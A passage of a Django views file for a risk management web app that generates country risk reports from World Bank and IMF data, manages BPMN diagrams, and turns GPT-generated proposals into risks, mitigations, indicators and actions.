            "2005, the European Union granted candidate status to the country. A critical component of the SAA is a preferential trade agreement "
            "that allows products from North Macedonia to enter the European Union duty free. The agreement also provides for a gradual reduction "
            "of duty rates for European Union products entering North Macedonia. The EU gave its formal approval to begin accession talks with "
            "North Macedonia in March 2020 and launched the first phase of accession talks with the country in July 2022.",
            style='Normal'
        )

        doc.add_paragraph(
            "North Macedonia, Serbia, and Albania rebranded the “mini-Schengen” proposal as the “Open Balkan” initiative at the Economic Forum "
            "on Regional Cooperation held in July 2021 in Skopje.",
            style='Normal'
        )
 
        doc.add_paragraph(
            "Member countries have signed several tripartite agreements to facilitate imports "
            "and exports of goods, offer free access to the labor market, and mutual recognition of laboratory tests and certificates from the three "
            "countries. The Green Lanes at the border crossings between these three countries could reduce wait times for goods and allow customs "
            "formalities to be performed at the final destination in the importing country.",
            style='Normal'
        )

        

    else:
        # Fallback for unsupported countries
        doc.add_paragraph(f"No trade guide data available for {country}.", style='Normal')


from docx.oxml import OxmlElement
from docx.shared import Inches

def add_logo_to_header(doc, logo_path):
    # Get the section's header
    section = doc.sections[0]
    header = section.header
    paragraph = header.paragraphs[0]
    run = paragraph.add_run()

    # Add the logo image
    if logo_path:
        run.add_picture(logo_path, width=Inches(1.5))  # Adjust size as needed
    else:
        raise FileNotFoundError('Logo file not found in static/images.')




def generate_country_risk_report(request, country):
    country_codes = {"Greece": "GRC", "North Macedonia": "MKD"}
    country_code = country_codes.get(country)
    eu_code = "EUU"

    if not country_code:
        return HttpResponse(f"Error: Unsupported country '{country}'", status=400)

    doc = Document()
    doc.add_heading(f'Country Risk Report: {country}', 0)

    doc = Document()

    logo_path = finders.find('images/avax-logo.jpeg')

    add_logo_to_header(doc, logo_path)  # Add the logo to the header
    doc.add_heading(f'Country Risk Report: \n{country}', 0)

    # Set default font
    style = doc.styles['Normal']
    font = style.font
    font.name = 'Calibri'
    font.size = Pt(11)

    doc.add_paragraph("Prepared by: Risk Management Unit")
    doc.add_paragraph(f"Date: {datetime.datetime.today().strftime('%Y-%m-%d')}")

    # Fetch country information
    # Replace fetching country information with a custom introduction
    doc.add_heading("Introduction and Background\n", level=1)
    doc.add_paragraph(
        f"This report aims to provide an overview of the economic and business environment in {country}. "
        "The report examines key economic indicators, trade and investment opportunities, regulatory conditions, and potential challenges "
        "facing businesses in the country."
    )

    
    

    # Fetch and add credit ratings
    country_rating = fetch_credit_ratings(country)
    if country_rating:
        doc.add_heading("Credit Ratings\n", level=2)
        for agency, rating in country_rating.items():
            doc.add_paragraph(f"{agency}: {rating}", style='List Bullet')

    
    add_trade_guide_section(doc, country)  # Replace "North Macedonia" with the desired country

    ## Add the new section for the Annex with a page break and heading
    doc.add_page_break()
    doc.add_heading("Annex 1", level=1)

    # Add a brief description of the Annex content
    doc.add_paragraph(
    "Annex 1 provides detailed graphs and data analysis related to various economic indicators, comparing the country's performance with EU benchmarks. "
    "The indicators covered in this annex include Economic Output, Employment, Debt and Fiscal Health, Trade and Investment, and Inflation and Monetary Policy. "
 
    )
    doc.add_paragraph(
   
    "The following data has been sourced from the World Bank: https://data.worldbank.org/."
    )

    doc.add_page_break()

    
    # Thematically grouped economic indicators
    indicator_groups = {
        "Economic Output": {
            'NY.GDP.MKTP.CD': ('GDP (current US$)', 'US$'),
            'NY.GDP.MKTP.KD.ZG': ('GDP growth (annual %)', '%'),
            'NY.GDP.PCAP.CD': ('GDP per capita (current US$)', 'US$')
        },
        "Employment": {
            'SL.UEM.TOTL.ZS': ('Unemployment, total (% of total labor force)', '%'),
            'SL.UEM.1524.ZS': ('Youth unemployment (% of labor force ages 15-24)', '%')
        },
        "Debt and Fiscal Health": {
            'GC.DOD.TOTL.GD.ZS': ('Government debt (% of GDP)', '%'),
            'GC.TAX.TOTL.GD.ZS': ('Total tax revenue (% of GDP)', '%')
        },
        "Trade and Investment": {
            'NE.EXP.GNFS.ZS': ('Exports of goods and services (% of GDP)', '%'),
            'NE.IMP.GNFS.ZS': ('Imports of goods and services (% of GDP)', '%'),
            'BX.KLT.DINV.WD.GD.ZS': ('Foreign direct investment, net inflows (% of GDP)', '%')
        },
        "Inflation and Monetary Policy": {
            'FP.CPI.TOTL.ZG': ('Inflation, consumer prices (annual %)', '%'),
            # 'FR.INR.RINR': ('Real interest rate (%)', '%')
        }
    }




    collected_data = fetch_economic_indicators(country_code, eu_code, {key: val for group in indicator_groups.values() for key, val in group.items()})

   # Example mapping of indicator descriptions for more meaningful explanations
    indicator_descriptions = {
        'NY.GDP.MKTP.CD': "the total market value of all goods and services produced within a country during a given year, often referred to as the Gross Domestic Product (GDP) at current prices.",
        'NY.GDP.MKTP.KD.ZG': "the annual percentage growth rate of GDP at constant prices, indicating the pace of economic expansion or contraction.",
        'NY.GDP.PCAP.CD': "the Gross Domestic Product per capita, representing the average economic output per person in the country.",
        'SL.UEM.TOTL.ZS': "the unemployment rate as a percentage of the total labor force, reflecting the proportion of people actively seeking work but unable to find employment.",
        'SL.UEM.1524.ZS': "the youth unemployment rate as a percentage of the labor force aged 15-24 years, indicating challenges faced by young people in finding employment.",
        'GC.DOD.TOTL.GD.ZS': "the total government debt as a percentage of GDP, showing the level of public indebtedness relative to the size of the economy.",
        'GC.TAX.TOTL.GD.ZS': "the total tax revenue collected as a percentage of GDP, reflecting the country's tax collection efficiency.",
        'NE.EXP.GNFS.ZS': "the value of exports of goods and services as a percentage of GDP, illustrating the openness of the country's economy to international trade.",
        'NE.IMP.GNFS.ZS': "the value of imports of goods and services as a percentage of GDP, highlighting the country's reliance on external goods and services.",
        'BX.KLT.DINV.WD.GD.ZS': "the net inflows of foreign direct investment as a percentage of GDP, indicating the level of foreign investment in the country's economy.",
        'FP.CPI.TOTL.ZG': "the annual percentage change in the Consumer Price Index (CPI), measuring the rate of inflation faced by consumers.",
        # 'FR.INR.RINR': "the real interest rate, representing the lending interest rate adjusted for inflation."
    }

    for group_name, indicators in indicator_groups.items():
        doc.add_heading(group_name, level=2)
        for indicator_id, (indicator_name, unit) in indicators.items():
            doc.add_heading(indicator_name, level=3)
            data = collected_data.get(indicator_id)
            description = indicator_descriptions.get(indicator_id, f"{indicator_name.lower()} for {country}")
            
            if data is not None:
                if indicator_id == 'NY.GDP.MKTP.CD':
                    add_separate_gdp_graphs(doc, data, indicator_id, indicator_name, country, country_code)
                else:
                    add_graph_to_doc(doc, data, indicator_id, indicator_name, country, country_code)
                
                start_year = data['Year'].iloc[0]
                end_year = data['Year'].iloc[-1]
                start_value = data[f"{indicator_id}_{country_code}"].iloc[0]
                end_value = data[f"{indicator_id}_{country_code}"].iloc[-1]
                formatted_start = format_large_number(start_value)
                formatted_end = format_large_number(end_value)
                trend = "increased" if end_value > start_value else "decreased" if end_value < start_value else "remained stable"
                
                doc.add_paragraph(
                    f"The {indicator_name} represents {description} For {country} it {trend} from {formatted_start} in {start_year} "
                    f"to {formatted_end} in {end_year}."
                )
            else:
                doc.add_paragraph(
                    f"No data available for {indicator_name}. Please refer to other resources for more insights."
                )
    
    add_page_numbers_en(doc)

    # Add the new section for trade data

    response = HttpResponse(content_type='application/vnd.openxmlformats-officedocument.wordprocessingml.document')
    response['Content-Disposition'] = f'attachment; filename=Country_Risk_Report_{country}.docx'
    doc.save(response)

    return response

from django.shortcuts import render
from django.http import JsonResponse
import requests
import logging

logger = logging.getLogger(__name__)

from django.shortcuts import render
from django.http import JsonResponse
import requests
import logging

# logger = logging.getLogger(__name__)

def imf_reports_view(request):
    if request.method == 'GET' and 'country' in request.GET and 'indicators' in request.GET:
        countries = request.GET.get('country').split(',')
        indicators = request.GET.get('indicators').split(',')

        results = {'labels': [], 'datasets': []}
        try:
            for indicator in indicators:
                dataset = {'label': indicator, 'data': {}}
                for country in countries:
                    # Construct the IMF API URL
                    data_url = f"https://www.imf.org/external/datamapper/api/v1/{indicator}/{country}"
                    try:
                        response = requests.get(data_url, timeout=10)
                        if response.status_code == 200:
                            data = response.json()
                            logger.info(f"Data received from {data_url}: {data}")

                            # Extract indicator values
                            indicator_values = data.get('values', {}).get(indicator, {}).get(country, {})
                            if indicator_values:
                                years = list(indicator_values.keys())
                                values = list(indicator_values.values())

                                # Update results
                                if not results['labels']:
                                    results['labels'] = years  # Only set labels once
                                dataset['data'][country] = values
                            else:
                                logger.warning(f"No values found for indicator {indicator} in country {country}")
                        else:
                            logger.error(f"Failed to fetch data from {data_url}. Status code: {response.status_code}")
                    except requests.RequestException as e:
                        logger.error(f"Error fetching data from {data_url}: {e}")
                        dataset['data'][country] = []  # Empty data for this country

                results['datasets'].append(dataset)
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            return JsonResponse({'error': 'An unexpected error occurred while processing the data.'}, status=500)

        return JsonResponse(results)

    # Fetch countries and indicators for the selection form
    countries = []
    indicators = {}
    try:
        # Fetch countries
        country_response = requests.get('https://www.imf.org/external/datamapper/api/v1/countries', timeout=10)
        if country_response.status_code == 200:
            country_data = country_response.json()
            countries = [
                {'code': code, 'name': details.get('label', 'N/A')}
                for code, details in country_data.get('countries', {}).items()
                if details.get('label')  # Exclude entries with no label
            ]
        else:
            logger.error(f"Failed to fetch countries. Status code: {country_response.status_code}")
    except requests.RequestException as e:
        logger.error(f"Error fetching countries: {e}")

    try:
        # Fetch indicators
        indicator_response = requests.get('https://www.imf.org/external/datamapper/api/v1/indicators', timeout=10)
        if indicator_response.status_code == 200:
            indicator_data = indicator_response.json()
            for code, details in indicator_data.get('indicators', {}).items():
                label = details.get('label', 'Unknown Indicator')
                category = details.get('category', 'Uncategorized')
                if category not in indicators:
                    indicators[category] = []
                indicators[category].append({
                    'code': code,
                    'name': label,
                    'description': details.get('description', 'No description available'),
                    'unit': details.get('unit', '')
                })
        else:
            logger.error(f"Failed to fetch indicators. Status code: {indicator_response.status_code}")
    except requests.RequestException as e:
        logger.error(f"Error fetching indicators: {e}")

    return render(request, 'imf_reports_landing.html', {'countries': countries, 'indicator_groups': indicators})


from django.shortcuts import render

def procedure_design_view(request):
    return render(request, 'procedure_design.html')

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from .models import BpmnDiagram

@csrf_exempt
def save_diagram(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            name = data.get('name')
            xml_content = data.get('xml')

            if not name or not xml_content:
                return JsonResponse({'error': 'Invalid data'}, status=400)

            # Update if diagram with the same name exists, otherwise create a new one
            diagram, created = BpmnDiagram.objects.update_or_create(
                name=name,
                defaults={'xml_content': xml_content}
            )
            return JsonResponse({
                'message': 'Diagram saved',
                'created': created  # This will be False if an existing diagram was updated
            })
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=500)


def get_diagram(request, name):
    if request.method == 'GET':
        try:
            diagram = BpmnDiagram.objects.get(name=name)
            return JsonResponse({'name': diagram.name, 'xml_content': diagram.xml_content})
        except BpmnDiagram.DoesNotExist:
            return JsonResponse({'error': 'Diagram not found'}, status=404)

@csrf_exempt
def delete_diagram(request, name):
    if request.method == 'DELETE':
        try:
            diagram = BpmnDiagram.objects.get(name=name)
            diagram.delete()
            return JsonResponse({'message': 'Diagram deleted'})
        except BpmnDiagram.DoesNotExist:
            return JsonResponse({'error': 'Diagram not found'}, status=404)


def list_diagrams(request):
    if request.method == 'GET':
        diagrams = BpmnDiagram.objects.all().values('id', 'name', 'updated_at')
        return JsonResponse(list(diagrams), safe=False)





# ------------------------------------------------------
from django.shortcuts import render
from django.db import connection

def list_db_tables(request):
    # Fetch the list of tables from the database
    tables = connection.introspection.table_names()
    tables.sort()

    # Collect table details and relationships
    table_details = []
    relationships = []

    for table in tables:
        try:
            # Get columns for each table
            columns = connection.introspection.get_table_description(connection.cursor(), table)
            column_names = [col.name for col in columns]

            # Add table details
            table_details.append({
                'name': table,
                'columns': column_names
            })

            # Fetch foreign key relationships if available
            for rel in connection.introspection.get_relations(connection.cursor(), table).values():
                if rel[1]:  # rel[1] contains the referenced table
                    relationships.append({
                        'source': table,
                        'target': rel[1]
                    })
        except Exception as e:
            table_details.append({
                'name': table,
                'columns': ['Error retrieving columns'],
                'error': str(e)
            })

    context = {
        'table_details': table_details,
        'relationships': relationships
    }
    return render(request, 'er_diagram.html', context)


# views.py

from django.shortcuts import render

def risk_proposals_page(request):
    # Fetch proposals from the session
    proposals_data = request.session.pop('generated_proposals_data', {})

    return render(request, 'risk_proposals_page.html', {
        'proposals_data': proposals_data,
    })

from django.shortcuts import render
from .models import Risk



from django.shortcuts import render, redirect
from .models import Risk
from orm.services import generate_risk_proposals  # Assuming your proposal generation function is in services.py

def generate_proposals_for_selected_risks(request):
    if request.method == 'POST':
        selected_risk_ids = request.POST.getlist('selected_risks')  # Get selected risks from the form
        selected_risks = Risk.objects.filter(id__in=selected_risk_ids)

        # Generate proposals using OpenAI for each selected risk
        proposals_data = {}
        for risk in selected_risks:
            proposals = generate_risk_proposals(risk)
            proposals_data[risk.id] = {
                'title': risk.title,
                'description': risk.description,
                'proposals': proposals,
            }

        # Store the generated proposals data in the session
        request.session['generated_proposals_data'] = proposals_data

        # Redirect to the proposals page
        return redirect('risk_proposals_page')
    else:
        return redirect('risk_selection_landing')  # Redirect to the landing page if not a POST request

    
# views.py
from django.shortcuts import render, redirect
from .models import Risk

def generate_selected_risks_report(request):
    if request.method == 'POST':
        selected_risk_ids = request.POST.getlist('selected_risks')  # Retrieves selected risks from the form
        selected_risks = Risk.objects.filter(id__in=selected_risk_ids)

        # Add logic to generate and handle the report with the selected risks
        return render(request, 'report_generated.html', {'selected_risks': selected_risks})
    else:
        return redirect('risk_selection_landing')  # Redirects to landing if not a POST request

# views.py
from django.shortcuts import render
from .models import Risk
from .services import generate_risk_proposals  # Assuming generate_risk_proposals is in services.py




from django.shortcuts import render
from .models import Risk, UserProfile

@login_required
def risk_selection_landing(request):
    """
    View to display risks grouped by portfolio and handle selection of risks and portfolios.
    """
    if request.method == "GET":
        if request.user.is_superuser:
            risks = Risk.objects.select_related('portfolio').all()
            portfolios = Portfolio.objects.all()
        else:
            user_profile = request.user.userprofile
            portfolios = user_profile.portfolios.all()
            risks = Risk.objects.filter(portfolio__in=portfolios).select_related('portfolio')

        grouped_risks = {}
        for risk in risks:
            portfolio = risk.portfolio
            if portfolio not in grouped_risks:
                grouped_risks[portfolio] = []
            grouped_risks[portfolio].append(risk)

        sorted_grouped_risks = {
            portfolio: grouped_risks[portfolio]
            for portfolio in sorted(
                grouped_risks.keys(),
                key=lambda p: p.name if p is not None else ""
            )
        }


        return render(request, 'risk_selection_landing.html', {
            'grouped_risks': sorted_grouped_risks,
            'portfolios': portfolios
        })

    elif request.method == "POST":
        # Capture selected portfolio IDs, titles, and descriptions
        selected_portfolio_ids = request.POST.getlist("selected_portfolios")
        portfolio_titles = request.POST.getlist("portfolio_titles")
        portfolio_descriptions = request.POST.getlist("portfolio_descriptions")

        # Create a combined list of portfolios with metadata
        selected_portfolios = [
            {"id": portfolio_id, "title": title, "description": description}
            for portfolio_id, title, description in zip(selected_portfolio_ids, portfolio_titles, portfolio_descriptions)
        ]

        # Debugging logs to confirm data
        print("Selected Portfolios:", selected_portfolios)

        # Redirect to the report generation or handle the data further
        # Replace `generate_selected_risks_report` with your report generation URL
        return redirect("generate_selected_risks_report")
    
    return HttpResponse("Invalid request method.", status=405)






def strip_html_tags(html_content):
    # Use BeautifulSoup to strip HTML tags
    soup = BeautifulSoup(html_content, 'html.parser')
    return soup.get_text()

from django.http import HttpResponse
from docx import Document
from docx.shared import Pt, RGBColor
from bs4 import BeautifulSoup

def download_risk_report(request):
    # Extracting data to include in the report (replace with your logic)
    proposals_data = request.session.get('generated_proposals_data', {})

    # Create a Word document using python-docx
    document = Document()
    
    # Add disclaimer at the top of the report
    disclaimer = "Disclaimer: This report has been generated using OpenAI's GPT-3.5 model. The information provided is based on the analysis of the input data and should not be relied upon automatically for decision-making. Please verify the information independently before taking any action."
    
    # Add the disclaimer text
    disclaimer_paragraph = document.add_paragraph()
    disclaimer_paragraph.alignment = 1  # Center align the disclaimer
    run = disclaimer_paragraph.add_run(disclaimer)
    run.bold = True
    run.font.size = Pt(12)
    run.font.color.rgb = RGBColor(255, 0, 0)  # Red color for the disclaimer
    
    # Add a space between the disclaimer and the rest of the document
    document.add_paragraph()

    # Add the main report content
    document.add_heading('Generated Risk Report', level=1)

    if proposals_data:
        for risk_id, data in proposals_data.items():
            # Add risk title and description
            document.add_heading(data['title'], level=2)
            document.add_paragraph(strip_html_tags(data['description']))

            # Add proposals
            if data.get('proposals'):
                document.add_heading('Proposals', level=3)
                for proposal in data['proposals']:
                    # Each proposal is added as a paragraph (without numbering)
                    document.add_paragraph(proposal)

    else:
        document.add_paragraph("No proposals to display.")

    # Prepare the response
    response = HttpResponse(content_type='application/vnd.openxmlformats-officedocument.wordprocessingml.document')
    response['Content-Disposition'] = 'attachment; filename="risk_report.docx"'
    document.save(response)
    return response

def strip_html_tags(html_content):
    # Use BeautifulSoup to strip HTML tags
    soup = BeautifulSoup(html_content, 'html.parser')
    return soup.get_text()


from django.shortcuts import render, redirect
from django.contrib import messages
from orm.models import Risk

from django.shortcuts import render, redirect
from django.contrib import messages
from orm.models import Risk
def generate_selected_risks_report(request):
    if request.method == 'POST':
        # Debugging: Print all received POST data
        # print("Received POST data:", request.POST)

        # Fetch the selected GPT model
        selected_model = request.POST.get('gpt_model', 'gpt-4-turbo')  # Default to GPT-4 Turbo if not provided
        # print(f"DEBUG: Selected GPT model: {selected_model}")

        # Fetch the free text input (custom_context)
        custom_context = request.POST.get('custom_context', '').strip()

        # Fetch selected risks
        selected_risk_ids = request.POST.getlist('selected_risks')
        proposals_data = {}

        # Handle free text input explicitly
        if custom_context:
            # print(f"DEBUG: Processing custom context: '{custom_context}'")
            proposals = generate_risk_proposals(
                risk=None,  # Explicitly pass None to avoid risk context
                custom_context=custom_context,
                model=selected_model  # Pass the selected model
            )
            proposals_data['free_text'] = {
                'title': 'User Provided Context',
                'description': custom_context,
                'proposals': proposals
            }

        # Process selected risks
        for selected_id in selected_risk_ids:
            try:
                # Attempt to fetch the risk
                risk = Risk.objects.get(id=selected_id)
                # print(f"DEBUG: Processing risk with ID {selected_id}: {risk.title}")
                proposals = generate_risk_proposals(
                    risk=risk,
                    model=selected_model  # Pass the selected model
                )
                proposals_data[risk.id] = {
                    'title': risk.title,
                    'description': risk.description,
                    'proposals': proposals
                }
            except Risk.DoesNotExist:
                print(f"WARNING: Risk with ID {selected_id} does not exist.")
                continue

        # Debugging: Print the collected proposals data
        # print("DEBUG: Proposals data:", proposals_data)

        # Render the risk proposals page
        return render(request, 'risk_proposals_page.html', {
            'proposals_data': proposals_data,
            'selected_model': selected_model  # Include model in the template context
        })

    else:
        messages.error(request, 'Invalid request method.')
        return redirect('risk_selection_landing')




from django.shortcuts import render, redirect, HttpResponse
from django.contrib.auth.decorators import login_required
from .models import Category
from django.utils.text import Truncator

@login_required
def create_categories_from_proposals(request):
    if request.method == "POST":
        # Get selected proposals from POST data
        selected_proposals = request.POST.getlist("selected_proposals")

        # Ensure there are proposals selected
        if not selected_proposals:
            return HttpResponse("No proposals selected.", status=400)

        # Create categories for each selected proposal
        for proposal in selected_proposals:
            truncated_name = Truncator(proposal).chars(100)  # Truncate name to 100 characters
            category = Category(
                name=truncated_name,
                description=f"{proposal}",  # Set description to the full proposal text
            )
            category.save()

        # Redirect to the category admin list
        return redirect("admin:orm_category_changelist")
    else:
        return HttpResponse("Invalid request method.", status=405)



from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .models import Risk, UserProfile

@login_required
def create_related_risks_from_proposals(request):
    # Get the selected risk IDs and proposals from the POST data
    selected_risk_ids = request.POST.getlist('selected_risks')
    selected_proposals = request.POST.getlist('selected_proposals')

    # Ensure there are proposals selected
    if not selected_proposals:
        return HttpResponse("No proposals selected.", status=400)

    # Get the current user
    current_user = request.user.userprofile

    if 'free_text' in selected_risk_ids:
        # Handle free text proposals without a linked risk
        for proposal in selected_proposals:
            # Create a new risk based on the free text proposal
            new_risk = Risk(
                title=f"{proposal}",
                description=proposal,
            )
            new_risk.save()
            new_risk.owners.add(current_user)  # Assign the current user as the owner
    else:
        # Handle risks linked to selected IDs
        risks = Risk.objects.filter(id__in=selected_risk_ids)
        for risk in risks:
            for proposal in selected_proposals:
                new_risk = Risk(
                    title=f"{proposal}",
                    description=proposal,
                    portfolio=risk.portfolio,
                    category=risk.category,  # Use the same category as the original risk
                )
                new_risk.save()
                new_risk.owners.add(current_user)

    return redirect('admin:orm_risk_changelist')

@login_required
def create_mitigations_from_proposals(request):
    # Get the selected risk IDs and proposals from the POST data
    selected_risk_ids = request.POST.getlist('selected_risks')
    selected_proposals = request.POST.getlist('selected_proposals')

    # Ensure there are proposals selected
    if not selected_proposals:
        return HttpResponse("No proposals selected.", status=400)

    # Get the current user
    current_user = request.user.userprofile

    if 'free_text' in selected_risk_ids:
        # Handle free text proposals without a linked risk
        for proposal in selected_proposals:
            # Create a mitigation for the free-text proposal
            mitigation = Mitigation(
                title=proposal,
                description=proposal,
            )
            mitigation.save()
            mitigation.owners.add(current_user)  # Assign the current user as the owner
    else:
        # Handle mitigations linked to risks
        risks = Risk.objects.filter(id__in=selected_risk_ids)
        for risk in risks:
            for proposal in selected_proposals:
                mitigation = Mitigation(
                    title=proposal,
                    description=proposal,
                    portfolio=risk.portfolio,
                )
                mitigation.save()
                mitigation.owners.add(current_user)
                mitigation.risks.add(risk)

    return redirect('admin:orm_mitigation_changelist')





from django.shortcuts import render, redirect, HttpResponse
from django.contrib.auth.decorators import login_required
from django.utils.timezone import now
from django.utils.text import Truncator
from .models import Indicator, Risk, UserProfile

from django.shortcuts import render, redirect, HttpResponse
from django.contrib.auth.decorators import login_required
from django.utils.timezone import now
from django.utils.text import Truncator
from .models import Indicator, Risk, UserProfile
@login_required
def create_related_indicators_from_proposals(request):
    if request.method == "POST":
        # Get selected risk IDs and proposals from POST data
        selected_risk_ids = request.POST.getlist("selected_risks")
        selected_proposals = request.POST.getlist("selected_proposals")

        # Ensure there are proposals selected
        if not selected_proposals:
            return HttpResponse("No proposals selected.", status=400)

        # Get the current user
        current_user = request.user.userprofile

        if 'free_text' in selected_risk_ids:
            # Handle free text proposals without a linked risk
            for proposal in selected_proposals:
                truncated_title = Truncator(proposal).chars(100)  # Truncate title to 100 characters

                # Create a new indicator based on the free text proposal
                indicator = Indicator(
                    title=truncated_title,
                    description=f"{proposal}",
                    current_value=0.0,  # Default value
                    reporting_date=now().date(),  # Today's date
                    repetition_frequency='monthly',  # Default frequency
                    owner=current_user,  # Assign the current user as the owner
                )
                indicator.save()
        else:
            # Handle risks linked to selected IDs
            risks = Risk.objects.filter(id__in=selected_risk_ids)

            # Iterate over selected risks
            for risk in risks:
                for proposal in selected_proposals:
                    truncated_title = Truncator(proposal).chars(100)  # Truncate title to 100 characters

                    # Create a new indicator
                    indicator = Indicator(
                        title=truncated_title,
                        description=f"{proposal}",
                        current_value=0.0,  # Default value
                        reporting_date=now().date(),  # Today's date
                        repetition_frequency='monthly',  # Default frequency
                        owner=current_user,  # Assign the current user as the owner
                        portfolio=risk.portfolio,  # Use the same portfolio as the risk
                    )
                    indicator.save()
                    indicator.risks.add(risk)

        # Redirect back to the indicator list page or wherever you'd like
        return redirect("admin:orm_indicator_changelist")
    else:
        return HttpResponse("Invalid request method.", status=405)






from django.shortcuts import render, redirect, HttpResponse
from django.contrib.auth.decorators import login_required
from django.utils.timezone import now
from .models import Action, Risk, UserProfile

from django.utils.text import Truncator

from django.shortcuts import redirect, HttpResponse
from django.contrib.auth.decorators import login_required
from django.utils.text import Truncator
from .models import Action, Risk, UserProfile

@login_required
def create_actions_from_proposals(request):
    if request.method == "POST":
        # Get the selected risk IDs and proposals from POST data
        selected_risk_ids = request.POST.getlist("selected_risks")
        selected_proposals = request.POST.getlist("selected_proposals")

        # Ensure there are proposals selected
        if not selected_proposals:
            return HttpResponse("No proposals selected.", status=400)

        # Get the current user
        current_user = request.user.userprofile

        if 'free_text' in selected_risk_ids or not selected_risk_ids:
            # Handle free text proposals without a linked risk
            for proposal in selected_proposals:
                truncated_title = Truncator(proposal).chars(100)  # Truncate title to 100 characters

                # Create a new action based on the free text proposal
                action = Action(
                    title=truncated_title,
                    description=f"{proposal}",
                    owner=current_user,  # Assign the current user as the owner
                    status='pending',  # Default status
                )
                action.save()
        else:
            # Handle actions linked to risks
            risks = Risk.objects.filter(id__in=selected_risk_ids)
            for risk in risks:
                for proposal in selected_proposals:
                    truncated_title = Truncator(proposal).chars(100)  # Truncate title to 100 characters

                    # Create a new action linked to the risk
                    action = Action(
                        title=truncated_title,
                        description=f"{proposal}",
                        owner=current_user,  # Assign the current user as the owner
                        portfolio=risk.portfolio,  # Use the same portfolio as the risk
                        status='pending',  # Default status
                    )
                    action.save()

        # Redirect back to the action list page or wherever you'd like
        return redirect("admin:orm_action_changelist")
    else:
        return HttpResponse("Invalid request method.", status=405)

from django.http import HttpResponse
from docx import Document
import json







def download_proposals_as_word(request):
    if request.method == "POST":
        # Get proposals_data from POST data
        proposals_data = request.POST.get("proposals_data", "")
        
        try:
            # Decode the JSON string
            proposals_data = json.loads(proposals_data)
        except json.JSONDecodeError as e:
            return HttpResponse(f"JSON decode error: {e}", status=400)

        # Check if proposals_data is empty
        if not proposals_data:
            return HttpResponse("No proposals available for download.", status=400)

        # Create a Word document
        document = Document()
        document.add_heading("Proposals Report", level=1)

        for risk_id, data in proposals_data.items():
            document.add_heading(f"Risk ID: {risk_id}", level=2)
            document.add_paragraph(f"Title: {data.get('title', 'No Title')}")
            document.add_paragraph(f"Description: {data.get('description', 'No Description')}")
            document.add_heading("Proposals:", level=3)
            for proposal in data.get("proposals", []):
                document.add_paragraph(f"- {proposal}")

        # Return the Word document as a response
        response = HttpResponse(
            content_type='application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        )
        response['Content-Disposition'] = 'attachment; filename="Proposals.docx"'
        document.save(response)
        return response
    else:
        return HttpResponse("Invalid request method.", status=405)

from django.shortcuts import render, HttpResponse
from .services import generate_risk_proposals

def process_risks(request):
    if request.method == "POST":
        # Get the model selected by the user
        model = request.POST.get("model", "gpt-4")  # Default to gpt-4 if no model is selected
        context = request.POST.get("context", "")

        if not context:
            return HttpResponse("Please provide context for the analysis.", status=400)

        try:
            # Call the service with the selected model
            proposals = generate_risk_proposals(custom_context=context, model=model)
            return render(request, "results.html", {"proposals": proposals})
        except Exception as e:
            return HttpResponse(f"Error generating proposals: {str(e)}", status=500)

    return HttpResponse("Invalid request method.", status=405)


from django.contrib.auth.decorators import login_required
from django.urls import reverse
from django.shortcuts import render

@login_required
def external_tools_view(request):
    context = {
        'calendar_view_link': reverse('calendar_view'),
        'risk_pivot_table_link': reverse('risk_pivot_table'),
        'interactive_heatmap_link': reverse('new_risk_heatmap_view'),
        'reports_landing_page_link': reverse('reports_landing_page'),
        'username': request.user.username,
        'home_link': reverse('landing_page'),
        'approval_request_link': 'admin/orm/approvalrequest/',  # Direct link to approval requests
        'user_profile_link': 'admin/orm/userprofile/',          # Direct link to user profiles
        'portfolio_link': 'admin/orm/portfolio/',               # Direct link to portfolios
        'category_link': 'admin/orm/category/',                 # Direct link to categories
        'procedure_design_link': reverse('procedure_design'),    # New Procedure Design link
        # 'network_link': reverse('network_link')    # New Procedure Design link
        'counterparty_link': reverse('admin:orm_counterparty_changelist'),
        'kyc_standard_link': reverse('admin:orm_kycstandard_changelist'),
        'due_diligence_assessment_link': reverse('admin:orm_duediligenceassessment_changelist'),


    }

    # Direct links to custom admin models without reverse lookup
    context.update({
        'risk_list_link': 'admin/orm/risk/',
        'mitigation_list_link': 'admin/orm/mitigation/',
        'action_list_link': 'admin/orm/action/',
        'indicator_list_link': 'admin/orm/indicator/',
        'event_list_link': 'admin/orm/event/',
        'opportunity_list_link': 'admin/orm/opportunity/',
        'procedure_list_link': 'admin/orm/procedure/',  # New Procedure link
        'it_assets_link': 'admin/orm/itasset/',  # Direct link to IT Assets
        'risks_link': '/risks/'  # Direct link to IT Assets

    })




    # Conditionally add links based on user role
    if request.user.is_staff:
        context['admin_pivots_link'] = reverse('admin_pivots')
        context['reports_landing_page_link'] = reverse('reports_landing_page')
        context['user_portfolio_report_link'] = reverse('user_portfolio_report')
        # Add IMF Reports link only for admin users
        context['imf_reports_view_link'] = reverse('imf_reports_view')
        context['chart_view_link'] = reverse('risk_chart')
        context['chart_view_portfolio_link'] = reverse('risk_chart_porfolio')
        context['risk_network_link'] = reverse('risk_network')
        context['risk_chart_owner_link'] = reverse('risk_chart_owner')
        context['process_user_input_link'] = reverse('process_user_input')
        context['soa_link'] = reverse('generate_soa')

    return render(request, 'frontend.html', context)





from django.contrib.auth.decorators import login_required

@login_required
def risk_network_view(request):


    """
    Displays a risk network visualization.
    Superusers see all risks, while non-superusers see risks filtered by their assigned portfolios.
    """
    if request.user.is_superuser:
        # Superuser sees all risks
        risks = Risk.objects.all().select_related('category', 'portfolio').prefetch_related('mitigations', 'owners')
    else:
        # Non-superusers see risks filtered by their portfolios
        user_profile = request.user.userprofile
        risks = Risk.objects.filter(portfolio__in=user_profile.portfolios.all()).select_related(
            'category', 'portfolio'
        ).prefetch_related('mitigations', 'owners')

    nodes = []
    links = []
    node_ids = set()

    # Function to add a node if it doesn't exist
    def add_node(entity_id, name, entity_type, url=None, risk_level=None):
        if entity_id not in node_ids:
            node = {
                'id': entity_id,
                'name': name,
                'type': entity_type,
            }
            if url:
                node['url'] = url  # URL to the admin change view
            if risk_level:
                node['riskLevel'] = risk_level  # Applicable for Risk nodes
            nodes.append(node)
            node_ids.add(entity_id)

    for risk in risks:
        risk_id = f"risk_{risk.id}"

        # Calculate residual risk level based on residual_likelihood and residual_impact
